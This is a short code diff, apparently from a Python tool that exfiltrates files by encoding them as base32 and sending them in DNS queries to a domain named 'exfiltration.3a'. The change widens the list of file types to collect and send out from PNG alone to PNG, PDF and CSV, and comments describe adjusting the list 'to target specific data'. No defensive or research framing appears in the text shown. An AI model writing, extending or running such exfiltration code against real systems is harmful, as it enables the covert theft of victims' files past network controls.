@@ -17,7 +17,7 @@ TARGET_DOMAIN = 'exfiltration.3a'
 # extensions to search for and exfiltrate
 # list of file types to locate and send; adjust to target specific data
 # EXTS = ['.csv', '.txt', '.png', '.pdf']
-EXTS = ['.png']
+EXTS = ['.png','.pdf','.csv']
 
 def build_query(payload_b32):
     # Split base32 string into DNS-safe labels (≤63 chars)
